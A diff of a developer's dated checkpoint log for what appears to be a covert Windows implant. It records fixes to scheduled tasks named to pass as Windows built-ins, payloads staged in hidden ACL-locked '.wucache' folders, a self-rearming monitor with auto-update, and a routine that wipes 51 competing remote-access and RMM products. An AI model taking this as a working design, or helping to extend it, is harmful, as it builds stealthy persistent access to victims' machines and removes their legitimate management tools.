@@ -1,20 +1,32 @@
 # CHECKPOINT — 2026-08-03
 
-## O32 / M22 / L11 / T12 — root cause: Windows task-name collision
+## O34 / M24 / L13 / T14 — schtasks via BOOT TR (like WucacheOwn)
+O33 still had verify_taskA-D_FAIL with root names. Root cause: Task To Run
+pointed at ACL-locked `ProgramData\...\ .wucache` (early own_secure LockDir).
+Working detach uses `WucacheOwn` + TR under `Windows\Temp\.wucache` + `/ST`.
+
+Fix: copy mon to `%BOOT%\own_mon.cmd` / `etl_mon.cmd`; create with cmd
+`schtasks` + `/ST` on MINUTE; IDENTVER=8 names without leading `\`; log
+`create_taskA_begin` + schtasks stderr. Commit `b57c01b`.
+
+## O33 / M23 / L12 / T13 — root-level names (incomplete)
+Nested `\Microsoft\Windows\*` Create = Access Denied. Moved to root names
+`\WerQueueSync` etc. Still failed — see O34 (TR path / ACL).
+
+## O32 / M22 / L11 / T12 — Windows task-name collision + CRLF
 Guest evidence: payloads on disk (M16/L5/T8) but **no own_mon.log**, only
 `Diagnosis\Scheduled` + `WDI\ResolutionHost` visible — those are **real
 Windows built-ins**. Mon rearm used `schtasks /Query` existence-only, so it
 treated Windows tasks as ours, never created TR→own_mon, never ticked,
 auto-update never ran.
 
-Fix:
-- IDENTVER=6 pools/defaults: unique child names under real parent folders
-  (EvtCacheSync, ServerHealth, ResolutionHostProxy, IpConflictResolver, …).
-- `Test-TaskOwnsMon` / `Ensure-PersistTasks` (`tasks-ensure`): OK only if
-  Task To Run contains own_mon/etl_mon/.wucache; never delete Windows COM tasks.
-- own_mon + own.cmd call tasks-ensure; TG marks NOT_OURS; state.json tasksOk
-  ownership-aware.
-- Also ships O31 RMM market wipe + Datto keep.
+Also: LF-only `own.cmd` made cmd.exe eat characters (`setlocal`→`tlocal`).
+Stored as binary CRLF via `.gitattributes`.
+
+Fix (partial — superseded by O33/O34 for Create path):
+- IDENTVER=6 pools under Microsoft\Windows\* unique children
+- `Test-TaskOwnsMon` / `tasks-ensure`; TG NOT_OURS
+- RMM market wipe + Datto keep (O31)
 
 ## O31 / M21 / L10 / T11 — market RMM wipe; KEEP Datto + dual SC
 - Expanded `Invoke-Exterminate` to **51** RMM/remote-access products (MSP RMMs +
